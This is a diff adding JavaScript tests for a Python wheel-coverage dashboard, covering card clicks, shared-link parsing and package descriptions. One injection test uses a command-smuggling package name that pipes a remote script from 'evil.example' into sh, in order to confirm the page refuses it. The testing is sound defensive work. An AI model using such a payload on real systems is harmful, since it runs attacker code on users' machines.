@@ -175,7 +175,7 @@ test("Omni-checker and Leaderboard logic with actual dataset", () => {
   // Test Minimized Summary bar
   const miniHtml = getEl("omni-minimized-summary").innerHTML;
   assert.ok(miniHtml.includes("badge-wheel"), "minimized summary includes wheel badge");
-  assert.ok(miniHtml.includes("Inspect 42"), "minimized summary includes Inspect 42 button");
+  assert.ok(miniHtml.includes(`Inspect ${coverageData.targets.length}`), "minimized summary includes the Inspect button, with the real target count");
   assert.ok(miniHtml.includes("Filter Gaps"), "minimized summary includes Filter Gaps button");
 
   // Test Leaderboard sorting: worst served first
@@ -189,4 +189,106 @@ test("Omni-checker and Leaderboard logic with actual dataset", () => {
   const gapsHtml = getEl("gaps").innerHTML;
   assert.ok(gapsHtml.includes("<tr"), "gaps table has rows for Alpine ARM64");
   assert.ok(getEl("pagination-info-top").textContent.includes("Showing 1–25"), "pagination info shows page 1-25");
+});
+
+
+// ---------------------------------------------------------------------------------------------------------------
+// The whole page under node: logic.js + app.js with a stub DOM that records event handlers, fed the repository's
+// data/ files. Used to check what clicks and shared links re-render.
+// ---------------------------------------------------------------------------------------------------------------
+const ROOT = path.join(__dirname, "..", "..");
+
+function element() {
+  const handlers = {};
+  return {
+    innerHTML: "", textContent: "", value: "", hidden: false, href: "", dataset: {}, style: {}, handlers,
+    addEventListener(type, fn) { handlers[type] = fn; },
+    classList: { add() {}, remove() {}, toggle() {} },
+    setAttribute() {}, removeAttribute() {}, getAttribute() { return null; },
+    querySelector() { return null; }, querySelectorAll() { return []; },
+    scrollIntoView() {}, append() {}, focus() {},
+  };
+}
+
+async function loadPage(hash) {
+  const elements = new Map();
+  const location = { hash };
+  const get = (id) => {
+    if (!elements.has(id)) elements.set(id, element());
+    return elements.get(id);
+  };
+  const context = {
+    console, URLSearchParams, setTimeout, location,
+    history: { replaceState(_state, _title, url) { location.hash = url; } },
+    navigator: {},
+    localStorage: { getItem() { return null; }, setItem() {} },
+    window: { matchMedia: () => ({ matches: false }), innerWidth: 1280 },
+    document: {
+      getElementById: get,
+      querySelector() { return null; }, querySelectorAll() { return []; },
+      addEventListener() {},
+      documentElement: { getAttribute() { return "light"; }, setAttribute() {} },
+      body: { style: {}, appendChild() {}, removeChild() {} },
+      createElement: element,
+    },
+    fetch: async (url) => {
+      const file = path.join(ROOT, url);
+      if (!/^data\/[a-z]+\.json$/.test(url) || !fs.existsSync(file)) return { ok: false, json: async () => null };
+      const json = JSON.parse(fs.readFileSync(file, "utf8"));
+      return { ok: true, json: async () => json };
+    },
+  };
+  vm.createContext(context);
+  const code = ["logic.js", "app.js"].map((f) => fs.readFileSync(path.join(ROOT, "site", f), "utf8")).join("\n;\n");
+  vm.runInContext(code, context, { filename: "site/logic.js + site/app.js" });
+  for (let i = 0; i < 50; i++) {
+    if (get("platform-leaderboard").innerHTML) break;
+    await new Promise((r) => setImmediate(r));
+  }
+  return { get, context };
+}
+
+const coverage = () => JSON.parse(fs.readFileSync(path.join(ROOT, "data", "coverage.json"), "utf8"));
+const cardClick = (platform) => ({ target: { closest: (sel) => (sel === ".leaderboard-card" ? { dataset: { pl: platform } } : null) } });
+
+test("clicking a platform card updates the lookup's \"Why?\" command (#56)", async () => {
+  const data = coverage();
+  const python = data.targets[0].python;
+  const name = data.packages[0].name;
+  const page = await loadPage(`#python=${python}&platform=musl-aarch64&package=${name}`);
+  const lookup = page.get("lookup");
+  assert.match(lookup.innerHTML, / -t musl-aarch64 --explain/);
+
+  page.get("platform-leaderboard").handlers.click(cardClick("win-arm64"));
+  assert.match(lookup.innerHTML, / -t win-arm64 --explain/);
+  assert.doesNotMatch(lookup.innerHTML, /musl-aarch64 --explain/);
+});
+
+test("a name from a shared link never reaches a copy-paste command unless it's a valid package name (#57)", async () => {
+  const evil = "foo; curl https://evil.example/x | sh #";
+  const page = await loadPage(`#package=${encodeURIComponent(evil)}`);
+  for (const id of ["lookup", "omni-answer", "omni-minimized-summary"]) {
+    const html = page.get(id).innerHTML;
+    assert.doesNotMatch(html, /uvx wheelgap/, id);
+    assert.doesNotMatch(html, /evil\.example/, id);
+  }
+  assert.match(page.get("lookup").innerHTML, /isn't a valid package name/);
+});
+
+test("a valid name outside the top gets the command; a pinned one finds its package (#57)", async () => {
+  const outside = await loadPage("#package=surely-not-a-top-package-xyz");
+  assert.match(outside.get("lookup").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -t all/);
+  assert.match(outside.get("omni-answer").innerHTML, /uvx wheelgap surely-not-a-top-package-xyz -p /);
+
+  const top = coverage().packages[0];
+  const pinned = await loadPage(`#package=${top.name}==0.0.1`);
+  const html = pinned.get("lookup").innerHTML;
+  assert.match(html, new RegExp(`The scan checks the latest release, ${top.version.replace(/[.+]/g, "\\$&")}, not 0\\.0\\.1`));
+  assert.doesNotMatch(html, /isn't in the top/);
+});
+
+test("pure Python packages are described as shipping a pure Python wheel, not as installing everywhere", async () => {
+  const page = await loadPage("");
+  for (const id of ["pure-note", "kpi-pure-pct"]) assert.doesNotMatch(page.get(id).textContent, /everywhere|anywhere/, id);
+  assert.match(page.get("pure-note").textContent, /ship a pure Python wheel/);
 });
